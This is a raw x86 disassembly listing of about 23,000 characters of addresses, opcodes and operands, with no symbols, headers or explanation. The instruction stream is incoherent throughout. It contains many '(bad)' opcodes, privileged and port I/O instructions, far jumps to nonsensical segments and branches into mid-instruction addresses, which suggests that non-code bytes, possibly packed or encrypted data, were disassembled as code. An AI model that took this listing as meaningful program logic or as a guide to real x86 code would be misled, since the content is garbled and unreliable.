  4092c4:	outs   dx,DWORD PTR ds:[esi]
  4092c5:	outs   dx,DWORD PTR ds:[esi]
  4092c6:	push   0x6b
  4092c8:	fisttp DWORD PTR [edi+0x15a10e56]
  4092ce:	sub    eax,0x716f1359
  4092d3:	add    eax,DWORD PTR [ebp-0x3f]
  4092d6:	ins    BYTE PTR es:[edi],dx
  4092d7:	mov    eax,ds:0x53d5ac14
  4092dc:	inc    esp
  4092dd:	mov    al,ds:0xbc026d3
  4092e2:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4092e4:	and    DWORD PTR ds:0xb473f1d1,0x1c928e86
  4092ee:	inc    esi
  4092ef:	push   0x69
  4092f1:	inc    ebp
  4092f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f3:	fs mov esi,0xb2656956
  4092f9:	not    DWORD PTR [ecx+eax*2]
  4092fc:	shl    al,cl
  4092fe:	xchg   esp,eax
  4092ff:	loop   0x40930a
  409301:	or     eax,0x92bccaa0
  409306:	push   esi
  409307:	das    
  409308:	jp     0x4092bd
  40930a:	(bad)  
  40930b:	adc    al,0x37
  40930d:	inc    edx
  40930e:	retf   0xe2c6
  409311:	adc    BYTE PTR [esi],bl
  409313:	adc    eax,0xafade21f
  409318:	lahf   
  409319:	xor    ecx,eax
  40931b:	call   0xa8e4:0xe324a7ac
  409322:	push   ss
  409323:	loope  0x409350
  409325:	or     ebp,DWORD PTR [ebp-0x69]
  409328:	idiv   cl
  40932a:	jae    0x40933a
  40932c:	je     0x40938c
  40932e:	pmaxsw mm5,QWORD PTR [esp+edi*1-0x6f]
  409333:	in     eax,dx
  409334:	jmp    0x40938b
  409336:	add    esp,esi
  409338:	mov    esp,0xf655e74f
  40933d:	enter  0x2e3c,0xd5
  409341:	shr    DWORD PTR [esi-0x31641298],cl
  409347:	lahf   
  409348:	add    eax,0x95840dd6
  40934d:	(bad)  
  40934e:	mov    ds:0x8d43994f,al
  409353:	and    ecx,ecx
  409355:	das    
  409356:	or     dl,dh
  409358:	adc    BYTE PTR [edi-0x2b92c8c0],dl
  40935e:	push   ecx
  40935f:	push   0xffffffbb
  409361:	and    BYTE PTR [eax-0x6d],0xac
  409365:	adc    DWORD PTR ds:0xabe16027,0x60
  40936c:	lods   al,BYTE PTR ds:[esi]
  40936d:	jo     0x40934e
  40936f:	retf   
  409370:	dec    ecx
  409371:	outs   dx,BYTE PTR ds:[esi]
  409372:	xchg   ebp,eax
  409373:	dec    eax
  409374:	hlt    
  409375:	mov    esp,0x25551a10
  40937a:	add    DWORD PTR ss:[eax],0x76
  40937e:	jnp    0x409348
  409380:	fadd   QWORD PTR ds:0x937744a
  409386:	aam    0x84
  409388:	cwde   
  409389:	push   eax
  40938a:	out    0xf4,al
  40938c:	and    al,0x89
  40938e:	jp     0x4093e9
  409390:	cmc    
  409391:	lds    ebp,FWORD PTR [esi-0x7bc220ea]
  409397:	shl    BYTE PTR [edi-0x3c],cl
  40939a:	(bad)  
  40939b:	out    0x5c,eax
  40939d:	jmp    0x3634:0x76182051
  4093a4:	stos   BYTE PTR es:[edi],al
  4093a5:	push   ds
  4093a6:	inc    edi
  4093a7:	icebp  
  4093a8:	mov    ebp,0x7dd9aa6a
  4093ad:	rcr    ecx,1
  4093af:	bound  esp,QWORD PTR [ecx]
  4093b1:	pop    ds
  4093b2:	jge    0x4093fe
  4093b4:	sbb    eax,DWORD PTR [edx-0x2c2700cc]
  4093ba:	sbb    al,0x64
  4093bc:	fisubr DWORD PTR [eax-0x4d]
  4093bf:	fild   DWORD PTR [esp+eax*4]
  4093c2:	mov    ah,0x21
  4093c4:	je     0x4093eb
  4093c6:	out    0xe7,eax
  4093c8:	dec    ebx
  4093c9:	inc    ecx
  4093ca:	(bad)  
  4093cb:	scas   al,BYTE PTR es:[edi]
  4093cc:	jne    0x409445
  4093ce:	mov    BYTE PTR [edi],dl
  4093d0:	jns    0x4093f8
  4093d2:	inc    ecx
  4093d3:	aas    
  4093d4:	mul    BYTE PTR [esi]
  4093d6:	and    bh,bh
  4093d8:	sahf   
  4093d9:	jg     0x40940d
  4093db:	mov    dl,dl
  4093dd:	dec    esp
  4093de:	mov    ah,0x2
  4093e0:	xchg   edx,eax
  4093e1:	stos   DWORD PTR es:[edi],eax
  4093e2:	mov    gs,WORD PTR [ebx]
  4093e4:	js     0x4093ac
  4093e6:	mov    ecx,0x312725d7
  4093eb:	(bad)
  4093ef:	inc    eax
  4093f0:	popa   
  4093f1:	icebp  
  4093f2:	in     al,0xdc
  4093f4:	pop    ecx
  4093f5:	xchg   esi,eax
  4093f6:	jg     0x409454
  4093f8:	xor    ah,BYTE PTR [esi+0x27]
  4093fb:	gs (bad) 
  4093fd:	push   esp
  4093fe:	mov    ah,ah
  409400:	ins    BYTE PTR es:[edi],dx
  409401:	adc    eax,0xc8f1328
  409406:	adc    eax,0xe3747845
  40940b:	arpl   WORD PTR [eax],cx
  40940d:	lea    esp,[edx]
  40940f:	js     0x4093be
  409411:	and    BYTE PTR [ebx-0x249ec114],0xfb
  409418:	add    dl,BYTE PTR [eax]
  40941a:	rcr    esi,cl
  40941c:	pop    edx
  40941d:	fisttp DWORD PTR [ebp+0x65]
  409420:	fst    DWORD PTR [esi+0x34b3b694]
  409426:	adc    BYTE PTR ds:0x883af092,ah
  40942c:	mov    ebp,0x505f47b8
  409431:	jno    0x409466
  409433:	dec    esp
  409434:	lods   eax,DWORD PTR ds:[esi]
  409435:	sbb    eax,0x63991d13
  40943a:	xor    bh,BYTE PTR [eax+0x6686f1b8]
  409440:	mov    edx,0x85d1ba03
  409445:	(bad)  
  409446:	std    
  409447:	or     eax,0xed348963
  40944c:	jmp    0xff7b8cab
  409451:	lods   al,BYTE PTR ds:[esi]
  409452:	mov    edx,es
  409454:	cdq    
  409455:	cs das 
  409457:	stos   DWORD PTR es:[edi],eax
  409458:	inc    eax
  409459:	std    
  40945a:	test   al,0x7f
  40945c:	mov    edi,DWORD PTR ds:0xb680898e
  409462:	lahf   
  409463:	std    
  409464:	mov    dh,0x4b
  409466:	ret    0xdb9f
  409469:	lea    esi,[esi]
  40946b:	aad    0x78
  40946d:	add    BYTE PTR [edi-0x13],cl
  409470:	xor    eax,edx
  409472:	mov    al,ds:0xf2faad9
  409477:	pushf  
  409478:	dec    edi
  409479:	push   esi
  40947a:	pop    eax
  40947b:	adc    esp,DWORD PTR [ecx]
  40947d:	fisubr WORD PTR [edi+esi*4+0x72f5b361]
  409484:	mov    ebp,esi
  409486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409488:	mov    edx,0x3f52a054
  40948d:	xchg   ebx,eax
  40948e:	sbb    al,0xa1
  409490:	in     al,dx
  409491:	gs pop edx
  409493:	pop    ebx
  409494:	ror    DWORD PTR [ebp+0x59],cl
  409497:	(bad)  
  409498:	ss jecxz 0x409512
  40949b:	push   0xf6c6d2bd
  4094a0:	mov    al,ds:0xf169f7c9
  4094a5:	or     al,0xb4
  4094a7:	mov    edi,0x19cd67eb
  4094ac:	inc    esp
  4094ad:	mov    ch,0xcc
  4094af:	xor    bl,bl
  4094b1:	cdq    
  4094b2:	xor    BYTE PTR [esi],dh
  4094b4:	cdq    
  4094b5:	sbb    al,0xab
  4094b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094b8:	xchg   ebx,eax
  4094b9:	clc    
  4094ba:	pop    es
  4094bb:	sbb    eax,DWORD PTR [edi+0x3a64e59f]
  4094c1:	fild   QWORD PTR [edx-0x60]
  4094c4:	sub    eax,0x8f9f164f
  4094c9:	dec    edx
  4094ca:	lea    edi,[esi]
  4094cc:	les    ebx,FWORD PTR [edx-0x6e6b0080]
  4094d2:	icebp  
  4094d3:	daa    
  4094d4:	daa    
  4094d5:	cmp    al,0xdc
  4094d7:	aas    
  4094d8:	arpl   WORD PTR [ecx],bx
  4094da:	push   es
  4094db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094dc:	in     eax,0x4d
  4094de:	pop    ecx
  4094df:	loope  0x40947c
  4094e1:	stos   DWORD PTR es:[edi],eax
  4094e2:	stos   BYTE PTR es:[edi],al
  4094e3:	popa   
  4094e4:	stos   DWORD PTR es:[edi],eax
  4094e5:	pop    ss
  4094e6:	mov    ecx,0xeedfa046
  4094eb:	outs   dx,DWORD PTR ds:[esi]
  4094ec:	arpl   WORD PTR [esp+eax*4],di
  4094ef:	aam    0x67
  4094f1:	shl    DWORD PTR [ebx],cl
  4094f3:	cmc    
  4094f4:	(bad)  
  4094f6:	mov    esp,0x3fccc6ce
  4094fb:	pop    es
  4094fc:	xchg   edi,eax
  4094fd:	scas   eax,DWORD PTR es:[edi]
  4094fe:	xor    dl,BYTE PTR [esi+0x53]
  409501:	out    0xe8,eax
  409503:	scas   eax,DWORD PTR es:[edi]
  409504:	fistp  WORD PTR [ebx]
  409506:	stos   DWORD PTR es:[edi],eax
  409507:	jns    0x4094c9
  409509:	ja     0x409548
  40950b:	dec    esi
  40950c:	adc    BYTE PTR [esi],dh
  40950e:	(bad)  
  40950f:	xchg   ebx,eax
  409510:	xor    eax,0xf9f13b33
  409515:	mov    eax,DWORD PTR [eax-0x70]
  409518:	in     eax,0x2e
  40951a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40951b:	fidiv  WORD PTR [edx]
  40951d:	push   edi
  40951e:	jl     0x40954e
  409520:	cld    
  409521:	jns    0x409584
  409523:	fwait
  409524:	outs   dx,BYTE PTR ds:[esi]
  409525:	retf   0xaa3a
  409528:	jmp    0x409541
  40952a:	sbb    al,0x75
  40952c:	and    eax,0x50864b3e
  409531:	ffreep st(4)
  409533:	mov    cl,0xb6
  409535:	cmc    
  409536:	pusha  
  409537:	nop
  409538:	test   eax,0xef084541
  40953d:	mov    ah,0xaf
  40953f:	dec    esi
  409540:	(bad)  
  409541:	loopne 0x409595
  409543:	fisub  DWORD PTR [edi]
  409545:	scas   al,BYTE PTR es:[edi]
  409546:	(bad)  
  409547:	ror    DWORD PTR [esi+0x3904482b],1
  40954d:	fwait
  40954e:	test   al,0x94
  409550:	cli    
  409551:	jg     0x4094de
  409553:	aam    0x18
  409555:	loop   0x40955c
  409557:	pop    esp
  409558:	jbe    0x4094df
  40955a:	fstp   QWORD PTR [edx-0x34]
  40955d:	cli    
  40955e:	sub    al,bl
  409560:	scas   al,BYTE PTR es:[edi]
  409561:	sahf   
  409562:	fmul   st(0),st
  409564:	cs sbb al,0x89
  409567:	mov    ah,0x5
  409569:	and    eax,0x9a7699c1
  40956e:	sar    ecx,cl
  409570:	push   eax
  409571:	cmp    ebx,DWORD PTR [ecx-0x3b38ed1d]
  409577:	jb     0x4095e2
  409579:	stc    
  40957a:	retf   
  40957b:	sub    dh,BYTE PTR ds:0x140144d8
  409581:	ins    DWORD PTR es:[edi],dx
  409582:	and    DWORD PTR [ecx+0x32a987ae],0xffffffd6
  409589:	xlat   BYTE PTR ds:[ebx]
  40958a:	outs   dx,BYTE PTR ds:[esi]
  40958b:	xchg   ecx,eax
  40958c:	jb     0x409559
  40958e:	jnp    0x409554
  409590:	inc    DWORD PTR [ebx-0x73e7ee5b]
  409596:	(bad)  
  409597:	cld    
  409598:	out    0x69,eax
  40959a:	leave  
  40959b:	xchg   edi,eax
  40959c:	pop    edi
  40959d:	fsub   st(6),st
  40959f:	jg     0x409573
  4095a1:	inc    ebp
  4095a2:	test   edx,edi
  4095a4:	jo     0x409602
  4095a6:	popa   
  4095a7:	shl    DWORD PTR [edx],cl
  4095a9:	and    ebx,DWORD PTR [esi+0x6f]
  4095ac:	das    
  4095ad:	pop    ss
  4095ae:	push   0x49208b8
  4095b3:	cld    
  4095b4:	xchg   edx,eax
  4095b5:	sub    eax,0x8d1130b2
  4095ba:	jb     0x4095e5
  4095bc:	rcr    BYTE PTR [ebx+0x46],1
  4095bf:	fs push 0xffffffec
  4095c2:	call   0x45631fed
  4095c7:	jmp    0x7ac329c1
  4095cc:	in     eax,dx
  4095cd:	cli    
  4095ce:	retf   
  4095cf:	cmp    DWORD PTR [esi-0x28],0xffffffbf
  4095d3:	lock call 0x5326:0x17c0d312
  4095db:	fidiv  WORD PTR [esi+edx*8+0x2338f3b0]
  4095e2:	aaa    
  4095e3:	test   DWORD PTR [ebp-0x7d2013f3],ebx
  4095e9:	mov    dl,0xbc
  4095eb:	pop    esp
  4095ec:	pop    esp
  4095ed:	pop    es
  4095ee:	lea    ecx,[esp+eiz*8-0x36f88026]
  4095f5:	mov    DWORD PTR [edi-0x463450be],edi
  4095fb:	mov    edi,esp
  4095fd:	xchg   ebp,eax
  4095fe:	xchg   edx,eax
  4095ff:	test   BYTE PTR [esi-0x1a0422a],0x54
  409606:	js     0x409591
  409608:	cmp    eax,0x9517395
  40960d:	fistp  DWORD PTR [ebx]
  40960f:	cs sti 
  409611:	jo     0x409635
  409613:	mov    esi,0x776f7822
  409618:	imul   edx,DWORD PTR [ebp+eiz*1-0x1a],0x8fb57993
  409620:	aad    0x99
  409622:	mov    al,ds:0xe7d5a4b4
  409627:	xchg   edi,eax
  409628:	(bad)  
  409629:	mov    edi,0x94c4cb0b
  40962e:	and    ecx,DWORD PTR [ecx+edi*4-0x1bae0a83]
  409635:	mov    dh,0x4d
  409637:	pop    ebx
  409638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409639:	(bad)  
  40963a:	out    0xc6,eax
  40963c:	data16 or BYTE PTR [ecx],bh
  40963f:	or     BYTE PTR [edi+eiz*8-0xf],bl
  409643:	mov    WORD PTR [bp+0x5d9],cs
  409648:	(bad)  
  409649:	mov    esi,0xe7da1dcc
  40964e:	jp     0x409644
  409650:	push   eax
  409651:	mov    al,ds:0xb3e28e1f
  409656:	mov    dl,0x9
  409658:	dec    edx
  409659:	push   cs
  40965a:	(bad)  
  40965b:	mov    eax,ds:0x7ba956e7
  409660:	jne    0x409622
  409662:	(bad)  
  409663:	rol    BYTE PTR [ebp-0x17c30a7b],cl
  409669:	xchg   BYTE PTR [ebx+0x1],cl
  40966c:	imul   esp,DWORD PTR [edx-0x22],0x14
  409670:	cmp    bl,BYTE PTR [esi+0x45]
  409673:	push   eax
  409674:	faddp  st(3),st
  409677:	pop    es
  409678:	int    0xd4
  40967a:	add    DWORD PTR [edx-0x79],0xca089efa
  409681:	lock inc ebx
  409683:	inc    esi
  409684:	fadd   DWORD PTR [esi-0x64db791d]
  40968a:	jo     0x409702
  40968c:	and    al,0x46
  40968e:	xchg   ebx,eax
  40968f:	(bad)  
  409690:	jecxz  0x4096e5
  409692:	jmp    0x928a:0x58cae997
  409699:	popa   
  40969a:	imul   esi,DWORD PTR [ebx],0x62
  40969d:	add    ch,bh
  40969f:	int3   
  4096a0:	push   ds
  4096a1:	xchg   ebp,ebx
  4096a3:	iret   
  4096a4:	push   esi
  4096a5:	scas   eax,DWORD PTR es:[edi]
  4096a6:	cld    
  4096a7:	fstp   st(1)
  4096a9:	ins    BYTE PTR es:[edi],dx
  4096aa:	pop    ebx
  4096ab:	pop    ds
  4096ac:	xor    BYTE PTR [eax],bh
  4096ae:	iret   
  4096af:	adc    eax,0x8b18281e
  4096b4:	mov    al,0xdb
  4096b6:	ret    0xe19d
  4096b9:	adc    BYTE PTR [ecx+ebp*2],dh
  4096bc:	out    0x4a,al
  4096be:	dec    esi
  4096bf:	sbb    BYTE PTR [eax],bl
  4096c1:	in     eax,dx
  4096c2:	xor    DWORD PTR [edi+esi*1-0x78],ecx
  4096c6:	mov    BYTE PTR [esi],dl
  4096c8:	pop    es
  4096c9:	dec    ecx
  4096ca:	lods   al,BYTE PTR ds:[esi]
  4096cb:	rol    cl,cl
  4096cd:	and    BYTE PTR [ebx+0x6f117707],cl
  4096d3:	xchg   ebx,eax
  4096d4:	adc    esi,DWORD PTR [ebx+ebx*2]
  4096d7:	jmp    0x6444:0xdf529789
  4096de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096df:	mov    fs,edi
  4096e1:	sahf   
  4096e2:	imul   eax,DWORD PTR [ebx+0x46],0xbd6020e9
  4096e9:	push   ds
  4096ea:	mov    ebx,0x17b4c76a
  4096ef:	std    
  4096f0:	imul   BYTE PTR [edi-0x76614024]
  4096f6:	push   edi
  4096f7:	mov    eax,ds:0xb3e646c4
  4096fc:	ror    DWORD PTR ds:0x153fc1ca,1
  409702:	div    BYTE PTR [edx+edi*4-0x1c]
  409706:	sar    BYTE PTR ds:0x8588006c,cl
  40970c:	daa    
  40970d:	and    BYTE PTR [ebx],dh
  40970f:	dec    edx
  409710:	mov    cl,0xd8
  409712:	sbb    eax,0xbd171f76
  409717:	xchg   edx,eax
  409718:	cmp    DWORD PTR [ebx],0xd920fbfb
  40971e:	out    dx,eax
  40971f:	es cmp ch,ch
  409722:	mov    bl,0x81
  409724:	loope  0x409758
  409726:	out    dx,eax
  409727:	sub    al,0x70
  409729:	aad    0x37
  40972b:	xchg   esi,eax
  40972c:	(bad)  
  40972d:	fistp  DWORD PTR [eax-0x64]
  409730:	int3   
  409731:	mov    ebp,0xd59a613d
  409736:	adc    BYTE PTR [edx-0x5b],al
  409739:	addr16 cs pop ss
  40973c:	retf   0x24de
  40973f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409740:	ficomp DWORD PTR [edx+0x7c9ba944]
  409746:	ror    DWORD PTR [edx+0x16],cl
  409749:	xor    al,0x89
  40974b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40974c:	into   
  40974d:	sbb    dl,dl
  40974f:	ds push ebx
  409751:	push   edx
  409752:	div    DWORD PTR [esi+0x176c5cd7]
  409758:	das    
  409759:	inc    BYTE PTR [eax]
  40975b:	jno    0x409735
  40975d:	mov    eax,0x805026ca
  409762:	pop    es
  409763:	adc    al,0x0
  409765:	imul   edi,DWORD PTR [ecx+0x36993701],0xffffffee
  40976c:	pop    DWORD PTR [eax+0x505f3ae1]
  409772:	push   edx
  409773:	pop    es
  409774:	cmp    edi,DWORD PTR [eax]
  409776:	xlat   BYTE PTR ds:[ebx]
  409777:	rcl    BYTE PTR [ebp-0x3789fdf1],0xdc
  40977e:	jae    0x40974d
  409780:	add    ecx,0xd7697857
  409786:	jecxz  0x4097e8
  409788:	scas   al,BYTE PTR es:[edi]
  409789:	loope  0x409741
  40978b:	jnp    0x409771
  40978d:	out    0x82,eax
  40978f:	cmp    ch,BYTE PTR [esi-0x4de0016b]
  409795:	xor    ebx,DWORD PTR [edi-0x534f3f68]
  40979b:	mov    ds:0x7b06f4bb,al
  4097a0:	js     0x409818
  4097a2:	push   0xba2ae471
  4097a7:	and    esp,DWORD PTR ss:[eax]
  4097aa:	or     DWORD PTR [ecx],edi
  4097ac:	jae    0x4097b0
  4097ae:	repz into 
  4097b0:	mov    DWORD PTR [ebp+0x10faa26f],esi
  4097b6:	fcomp  QWORD PTR [ecx-0x1163af90]
  4097bc:	cmp    al,BYTE PTR [esi-0x81f9c87]
  4097c2:	mov    bh,0xbf
  4097c4:	retf   
  4097c5:	push   0xcacac9b0
  4097ca:	loope  0x409756
  4097cc:	push   ss
  4097cd:	mov    dl,0x70
  4097cf:	inc    ecx
  4097d0:	(bad)  
  4097d1:	ret    0x879
  4097d4:	retf   0x49d4
  4097d7:	sbb    bh,BYTE PTR [edi+ecx*4]
  4097da:	xchg   esi,eax
  4097db:	ror    BYTE PTR [esi],cl
  4097dd:	call   0xa11:0xc8dd5759
  4097e4:	repnz push eax
  4097e6:	sbb    DWORD PTR [esi],ebx
  4097e8:	pop    edx
  4097e9:	stos   BYTE PTR es:[edi],al
  4097ea:	lods   eax,DWORD PTR ds:[esi]
  4097eb:	push   DWORD PTR [ebx]
  4097ed:	cwde   
  4097ee:	(bad)  
  4097ef:	hlt    
  4097f0:	test   eax,0xa9398a99
  4097f5:	rep stos DWORD PTR es:[edi],eax
  4097f7:	jbe    0x40979d
  4097f9:	sahf   
  4097fa:	lea    edi,[ecx]
  4097fc:	rcr    esi,0x69
  4097ff:	jge    0x4097c7
  409801:	dec    edi
  409802:	(bad)  
  409803:	mov    ds:0x280517c3,al
  409808:	fs in  eax,0x64
  40980b:	sar    ch,cl
  40980d:	push   eax
  40980e:	sti    
  40980f:	push   ds
  409810:	sti    
  409811:	test   al,0xe8
  409813:	nop
  409814:	xchg   DWORD PTR [edx-0x73],ebp
  409817:	arpl   WORD PTR [eax-0x5],dx
  40981a:	in     ax,0x44
  40981d:	lea    eax,ds:[ebp-0x511c4b39]
  409824:	mov    edi,0x84da6aa1
  409829:	outs   dx,BYTE PTR ds:[esi]
  40982a:	inc    edi
  40982b:	dec    ebp
  40982c:	test   dh,ch
  40982e:	sbb    eax,0x22a07728
  409833:	sub    DWORD PTR [eax-0x62],0x785e593d
  40983a:	sahf   
  40983b:	aam    0x52
  40983d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40983e:	scas   eax,DWORD PTR es:[edi]
  40983f:	mov    WORD PTR [edx+0x584894e9],es
  409845:	or     eax,0x4deedf71
  40984a:	jo     0x40982c
  40984c:	jge    0x4098aa
  40984e:	enter  0x6b6e,0xab
  409852:	dec    eax
  409853:	mov    ebp,0xe202fca6
  409858:	enter  0xc673,0xb6
  40985c:	das    
  40985d:	mov    bh,al
  40985f:	mov    ebx,0x6b669fc2
  409864:	mov    ebx,0x710808c9
  409869:	jmp    0x4098d9
  40986b:	and    ecx,DWORD PTR [ebp-0x23]
  40986e:	sbb    eax,0x1fb53fec
  409873:	xor    eax,0x3c520c40
  409878:	cmp    DWORD PTR [edi],edi
  40987a:	pop    ds
  40987b:	cdq    
  40987c:	and    al,0x6d
  40987e:	jecxz  0x409835
  409880:	icebp  
  409881:	sbb    al,BYTE PTR [edx-0x69]
  409884:	dec    edi
  409885:	imul   edx,DWORD PTR ds:0xb1113148,0xffffffb2
  40988c:	add    al,0x4f
  40988e:	cmp    BYTE PTR [edi+ebp*2-0x76],dh
  409892:	aad    0x79
  409894:	push   cs
  409895:	and    al,0xed
  409897:	loop   0x4098c0
  409899:	cmp    eax,0x1f16d5f6
  40989e:	mov    dx,0x87b3
  4098a2:	jb     0x4098a4
  4098a4:	push   ebx
  4098a5:	mov    dh,BYTE PTR [esi-0x56056f35]
  4098ab:	xor    DWORD PTR [eax-0x32ef4273],edx
  4098b1:	mov    ebp,0xe330d9ee
  4098b6:	hlt    
  4098b7:	or     al,0xa4
  4098b9:	jg     0x409840
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	mov    edx,0x49aaa162
  4098c1:	(bad)  
  4098c2:	fidivr DWORD PTR ds:0x34c1839e
  4098c8:	cld    
  4098c9:	lds    esp,FWORD PTR [edi]
  4098cb:	fist   WORD PTR [ebx-0x75236aa5]
  4098d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098d2:	and    eax,0x2c6e4da7
  4098d7:	dec    ebx
  4098d8:	lds    ebx,FWORD PTR ds:[edi+0x23]
  4098dc:	rcl    esi,0x29
  4098df:	adc    ch,cl
  4098e1:	xchg   edx,eax
  4098e2:	gs cmp al,0xbf
  4098e5:	xchg   esp,eax
  4098e6:	mov    ah,0x8b
  4098e8:	mov    esp,DWORD PTR [ebp+ebx*2+0x714431d]
  4098ef:	fdiv   QWORD PTR [ebx+0x2b5ba96c]
  4098f5:	inc    esi
  4098f6:	sbb    bh,BYTE PTR [edi]
  4098f8:	push   eax
  4098f9:	mov    eax,ds:0x1f191b2b
  4098fe:	and    al,0xef
  409900:	jl     0x4098f9
  409902:	mov    cs,ebp
  409904:	xor    eax,0xc2f9174b
  409909:	sbb    DWORD PTR [esi+0x46eefd13],esi
  40990f:	mov    dh,BYTE PTR [ebx+0x364944b0]
  409915:	mov    dl,0x7d
  409917:	xor    ah,BYTE PTR [esi]
  409919:	push   ss
  40991a:	mov    esi,DWORD PTR [ecx-0x62]
  40991d:	push   ebp
  40991f:	imul   esi,DWORD PTR [ebx+0x7f52b620],0x7e39d5c7
  409929:	ins    DWORD PTR es:[edi],dx
  40992a:	mov    ebx,0xb5f018be
  40992f:	je     0x4098f4
  409931:	inc    edi
  409932:	sbb    al,0xb9
  409934:	jmp    0xa4c9:0x86ab97c5
  40993b:	inc    eax
  40993c:	adc    DWORD PTR [esi+0x55],eax
  40993f:	xchg   edi,eax
  409940:	cmp    DWORD PTR [ebx+0x72],edi
  409943:	loopne 0x409938
  409945:	ret    
  409946:	rcl    BYTE PTR [ebx-0x65],1
  409949:	pop    ds
  40994a:	(bad)  
  40994b:	outs   dx,BYTE PTR ds:[esi]
  40994c:	pop    esp
  40994d:	adc    bh,dh
  40994f:	xchg   ebx,eax
  409950:	push   es
  409951:	rol    DWORD PTR [edx+0x2b3bb768],cl
  409957:	icebp  
  409958:	jl     0x4099d9
  40995a:	push   edx
  40995b:	sbb    eax,0x430f7f1f
  409960:	inc    ebx
  409961:	or     bl,bl
  409963:	push   0x35128055
  409968:	jp     0x4099ab
  40996a:	and    DWORD PTR [ebp+eiz*8+0x7b],esp
  40996e:	lds    esi,FWORD PTR [edx]
  409970:	aas    
  409971:	out    dx,al
  409972:	jnp    0x4099b2
  409974:	hlt    
  409975:	push   ebp
  409976:	inc    esp
  409977:	push   ss
  409978:	add    DWORD PTR [ebx-0x33f58d8e],esp
  40997e:	nop
  40997f:	pop    edi
  409980:	sub    BYTE PTR [edi-0x19],0x57
  409984:	bound  ebp,QWORD PTR [ebp+0x218e48a2]
  40998a:	idiv   edi
  40998c:	add    BYTE PTR [eax+edx*2],bl
  40998f:	mov    bh,0xb0
  409991:	mov    dh,0xa
  409993:	addr16 in al,0xd5
  409996:	push   ebx
  409997:	sti    
  409998:	ds sbb dh,dh
  40999b:	sysexit 
  40999d:	cs pop ecx
  40999f:	push   edx
  4099a0:	mov    al,ds:0x2711cf57
  4099a5:	push   0xffffffe2
  4099a7:	pop    es
  4099a8:	pop    edx
  4099a9:	ds adc cl,al
  4099ac:	jne    0x4099d0
  4099ae:	mov    edi,0x88e19ed9
  4099b3:	add    eax,0x26721a4a
  4099b8:	mov    edi,0x680d7172
  4099bd:	xor    dh,dl
  4099bf:	test   DWORD PTR [ebp+esi*2+0x440aa0a7],edi
  4099c6:	pop    ss
  4099c7:	arpl   bx,ax
  4099c9:	(bad)  
  4099ca:	mov    bl,0x7f
  4099cc:	mov    eax,ds:0x3f39562f
  4099d1:	dec    esp
  4099d2:	sbb    ecx,DWORD PTR [edx+0x69]
  4099d5:	add    BYTE PTR [edx+edi*8-0x1d],0x41
  4099da:	xchg   edx,eax
  4099db:	inc    edx
  4099dc:	pop    ebx
  4099dd:	xor    esp,ebx
  4099df:	mov    ebx,0xd8291a4e
  4099e5:	fs inc eax
  4099e7:	push   ds
  4099e8:	sbb    ch,BYTE PTR [esi+edx*4+0x771d252d]
  4099ef:	loop   0x4099bf
  4099f1:	std    
  4099f2:	std    
  4099f3:	cmp    eax,0x8f78c022
  4099f8:	out    dx,al
  4099f9:	jl     0x4099e2
  4099fb:	test   BYTE PTR [ecx+0x285525b0],0x9f
  409a02:	int    0xfe
  409a04:	and    BYTE PTR [ebp-0x64],0xb7
  409a08:	pop    ds
  409a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a0a:	mov    ds:0x25ce5d82,al
  409a0f:	mov    bh,0x1e
  409a11:	loopne 0x4099d0
  409a13:	rcr    BYTE PTR [ebp+0x4a],1
  409a16:	mov    ds,WORD PTR [eax+edi*1-0x2f9d36fb]
  409a1d:	imul   edi,DWORD PTR [ecx+edx*2],0xffffffea
  409a21:	jg     0x4099fa
  409a23:	xor    eax,0x30309637
  409a28:	test   al,0x3c
  409a2a:	pop    edx
  409a2b:	jge    0x409a35
  409a2d:	iret   
  409a2e:	imul   ecx,ebx,0x16
  409a31:	lock inc ebx
  409a33:	inc    ebx
  409a34:	in     eax,dx
  409a35:	mov    cl,0x5a
  409a37:	jmp    0x74a5:0x70747d15
  409a3e:	ret    
  409a3f:	fidivr DWORD PTR [ebp-0x63]
  409a42:	mov    ch,0x1f
  409a44:	mov    ebx,0x981c8de8
  409a49:	out    dx,al
  409a4a:	aam    0x91
  409a4c:	push   cs
  409a4d:	int3   
  409a4e:	jle    0x409a25
  409a50:	lods   al,BYTE PTR ds:[esi]
  409a51:	push   0x95a402b
  409a56:	cld    
  409a57:	lods   eax,DWORD PTR ds:[esi]
  409a58:	(bad)  
  409a5a:	sub    cl,cl
  409a5c:	cmp    BYTE PTR [esi+0x1c],0x47
  409a60:	adc    DWORD PTR [ebx+ebx*8-0x25],eax
  409a64:	push   edi
  409a65:	xchg   esi,eax
  409a66:	push   ebp
  409a67:	push   esp
  409a68:	aam    0xce
  409a6a:	or     bl,BYTE PTR [edi+0x96371db]
  409a70:	cmp    eax,0x46e2ea15
  409a75:	sahf   
  409a76:	jb     0x409a4b
  409a78:	imul   esi,DWORD PTR [ebx],0xfffffffe
  409a7b:	test   dh,bh
  409a7d:	mov    edx,0xe584ab22
  409a82:	push   esp
  409a83:	and    ebx,ebx
  409a85:	cmp    edx,0xf8f00505
  409a8b:	jl     0x409ad3
  409a8d:	div    DWORD PTR [ebx-0x15]
  409a90:	out    dx,al
  409a91:	or     eax,0x221136b3
  409a96:	xlat   BYTE PTR ds:[ebx]
  409a97:	mov    al,0x2a
  409a99:	test   eax,0x7f2c4d02
  409a9e:	cmp    ah,BYTE PTR [ebx-0x6c]
  409aa1:	pop    ebx
  409aa2:	call   0xbd04:0x87a34fb5
  409aa9:	gs inc edi
  409aab:	push   ss
  409aac:	out    0x55,al
  409aae:	and    eax,0x6bab5fd3
  409ab3:	cdq    
  409ab4:	popa   
  409ab5:	xchg   ebx,eax
  409ab6:	adc    ch,BYTE PTR [ebp+0x7fa2f263]
  409abc:	(bad)  
